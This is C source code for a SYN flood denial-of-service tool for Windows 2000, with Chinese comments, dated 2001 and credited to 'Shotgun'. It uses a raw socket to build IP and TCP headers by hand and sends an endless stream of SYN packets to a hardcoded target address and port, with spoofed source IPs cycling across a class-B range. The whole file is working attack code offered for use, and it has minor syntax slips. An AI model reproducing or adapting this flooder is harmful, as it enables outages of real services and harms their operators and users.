//////////////////////////////////////////////////////////////////////////

//                                                                      //

//  SYN Flooder For Win2K by Shotgun                                    //

//                                                                      //

//  THIS PROGRAM IS MODIFIED FROM A LINUX VERSION BY Zakath             //

//  THANX Lion Hook FOR PROGRAM OPTIMIZATION                            //

//                                                                      //

//  Released:    [2001.4]                                                //

//  Author:     [Shotgun]                                               //

//  Homepage:                                                           //

//              [http://IT.Xici.Net]                                    //

//              [http://WWW.Patching.Net]                               //

//                                                                      //

//////////////////////////////////////////////////////////////////////////

#include <winsock2.h>

#include <Ws2tcpip.h>

#include <stdio.h>

#include <stdlib.h>

#define SEQ 0x28376839

#define SYN_DEST_IP "192.168.15.250"//被攻击的IP

#define FAKE_IP "10.168.150.1"       //伪装IP的起始值，本程序的伪装IP覆盖一个B类网段

#define STATUS_FAILED 0xFFFF      //错误返回值

  

typedef struct _iphdr              //定义IP首部

{

    unsigned char h_verlen;            //4位首部长度,4位IP版本号

    unsigned char tos;               //8位服务类型TOS

    unsigned short total_len;      //16位总长度（字节）

    unsigned short ident;            //16位标识

    unsigned short frag_and_flags;  //3位标志位

    unsigned char  ttl;              //8位生存时间 TTL

    unsigned char proto;         //8位协议 (TCP, UDP 或其他)

    unsigned short checksum;        //16位IP首部校验和

    unsigned int sourceIP;            //32位源IP地址

    unsigned int destIP;         //32位目的IP地址

}IP_HEADER;

  

struct                              //定义TCP伪首部

{

        unsigned long saddr;     //源地址

        unsigned long daddr;     //目的地址

        char mbz;

        char ptcl;                   //协议类型

        unsigned short tcpl;     //TCP长度

}psd_header;

  

typedef struct _tcphdr             //定义TCP首部

{

    USHORT th_sport;               //16位源端口

    USHORT th_dport;               //16位目的端口

    unsigned int th_seq;         //32位序列号

    unsigned int th_ack;         //32位确认号

    unsigned char th_lenres;        //4位首部长度/6位保留字

    unsigned char th_flag;            //6位标志位

    USHORT th_win;                 //16位窗口大小

    USHORT th_sum;                 //16位校验和

    USHORT th_urp;                 //16位紧急数据偏移量

}TCP_HEADER;

  

//CheckSum:计算校验和的子函数

USHORT checksum(USHORT *buffer, int size)

{ 

unsigned long cksum=0;

      while(size >1) {

    cksum+=*buffer++;

    size -=sizeof(USHORT);

  }

  if(size ) {

    cksum += *(UCHAR*)buffer;

  }

  cksum = (cksum >> 16) + (cksum & 0xffff);

  cksum += (cksum >>16);

  return (USHORT)(~cksum);

}

  

//  SynFlood主函数

int main()

{

    int datasize,ErrorCode,counter,flag,FakeIpNet,FakeIpHost;

    int TimeOut=2000,SendSEQ=0;

    char SendBuf[128]={0};

    char RecvBuf[65535]={0};

    WSADATA wsaData;

    SOCKET SockRaw=(SOCKET)NULL;

    struct sockaddr_in DestAddr;

    IP_HEADER ip_header;

    TCP_HEADER tcp_header;

    //初始化SOCK_RAW

    if((ErrorCode=WSAStartup(MAKEWORD(2,1),&wsaData))!=0){

        fprintf(stderr,"WSAStartup failed: %d\n",ErrorCode);

        ExitProcess(STATUS_FAILED);

    }

    SockRaw=WSASocket(AF_INET,SOCK_RAW,IPPROTO_RAW,NULL,0,WSA_FLAG_OVERLAPPED));

if (SockRaw==INVALID_SOCKET){

        fprintf(stderr,"WSASocket() failed: %d\n",WSAGetLastError());

        ExitProcess(STATUS_FAILED);

    }

    flag=TRUE;

    //设置IP_HDRINCL以自己填充IP首部

    ErrorCode=setsockopt(SockRaw,IPPROTO_IP,IP_HDRINCL,(char *)&flag,sizeof(int));

If (ErrorCode==SOCKET_ERROR)  printf("Set IP_HDRINCL Error!\n");

    __try{

        //设置发送超时

        ErrorCode=setsockopt(SockRaw,SOL_SOCKET,SO_SNDTIMEO,(char*)&TimeOut,sizeof(TimeOut));

if(ErrorCode==SOCKET_ERROR){

            fprintf(stderr,"Failed to set send TimeOut: %d\n",WSAGetLastError());

            __leave;

        }

        memset(&DestAddr,0,sizeof(DestAddr));

        DestAddr.sin_family=AF_INET;

        DestAddr.sin_addr.s_addr=inet_addr(SYN_DEST_IP);

        FakeIpNet=inet_addr(FAKE_IP);

        FakeIpHost=ntohl(FakeIpNet);

        //填充IP首部

        ip_header.h_verlen=(4<<4 | sizeof(ip_header)/sizeof(unsigned long));

//高四位IP版本号，低四位首部长度

        ip_header.total_len=htons(sizeof(IP_HEADER)+sizeof(TCP_HEADER));     //16位总长度（字节）

        ip_header.ident=1;                                                       //16位标识

        ip_header.frag_and_flags=0;                                               //3位标志位

        ip_header.ttl=128;                                                       //8位生存时间TTL

        ip_header.proto=IPPROTO_TCP;                                          //8位协议(TCP,UDP…)

        ip_header.checksum=0;                                                    //16位IP首部校验和

        ip_header.sourceIP=htonl(FakeIpHost+SendSEQ);                          //32位源IP地址

        ip_header.destIP=inet_addr(SYN_DEST_IP);                               //32位目的IP地址

    //填充TCP首部

        tcp_header.th_sport=htons(7000);                                      //源端口号

        tcp_header.th_dport=htons(8080);                                      //目的端口号

        tcp_header.th_seq=htonl(SEQ+SendSEQ);                                  //SYN序列号

        tcp_header.th_ack=0;                                                 //ACK序列号置为0

        tcp_header.th_lenres=(sizeof(TCP_HEADER)/4<<4|0);                        //TCP长度和保留位

        tcp_header.th_flag=2;                                                    //SYN 标志

        tcp_header.th_win=htons(16384);                                           //窗口大小

        tcp_header.th_urp=0;                                                 //偏移

        tcp_header.th_sum=0;                                                 //校验和

        //填充TCP伪首部（用于计算校验和，并不真正发送）

        psd_header.saddr=ip_header.sourceIP;                                    //源地址

        psd_header.daddr=ip_header.destIP;                                      //目的地址

        psd_header.mbz=0;

        psd_header.ptcl=IPPROTO_TCP;                                            //协议类型

        psd_header.tcpl=htons(sizeof(tcp_header));                              //TCP首部长度

        while(1) {

            //每发送10,240个报文输出一个标示符

            printf(".");

            for(counter=0;counter<10240;counter++){

                if(SendSEQ++==65536) SendSEQ=1;                                  //序列号循环

                //更改IP首部

                ip_header.checksum=0;                                            //16位IP首部校验和

                ip_header.sourceIP=htonl(FakeIpHost+SendSEQ);                  //32位源IP地址

                //更改TCP首部

                tcp_header.th_seq=htonl(SEQ+SendSEQ);                          //SYN序列号

                tcp_header.th_sum=0;                                         //校验和

                //更改TCP Pseudo Header

                psd_header.saddr=ip_header.sourceIP;                   

                //计算TCP校验和，计算校验和时需要包括TCP pseudo header         

                memcpy(SendBuf,&psd_header,sizeof(psd_header));   

                memcpy(SendBuf+sizeof(psd_header),&tcp_header,sizeof(tcp_header));

                tcp_header.th_sum=checksum((USHORT *)SendBuf,sizeof(psd_header)+sizeof(tcp_header));

                //计算IP校验和

                memcpy(SendBuf,&ip_header,sizeof(ip_header));

                memcpy(SendBuf+sizeof(ip_header),&tcp_header,sizeof(tcp_header));

                memset(SendBuf+sizeof(ip_header)+sizeof(tcp_header),0,4);

                datasize=sizeof(ip_header)+sizeof(tcp_header);

                ip_header.checksum=checksum((USHORT *)SendBuf,datasize);

                //填充发送缓冲区

                memcpy(SendBuf,&ip_header,sizeof(ip_header));

                //发送TCP报文

                ErrorCode=sendto(SockRaw,

                                SendBuf,

                                datasize,

                                0,

                                (struct sockaddr*) &DestAddr,

                                sizeof(DestAddr));

if (ErrorCode==SOCKET_ERROR) printf("\nSend Error:%d\n",GetLastError());

            }//End of for

        }//End of While

    }//End of try

  __finally {

    if (SockRaw != INVALID_SOCKET) closesocket(SockRaw);

    WSACleanup();

  }

  return 0;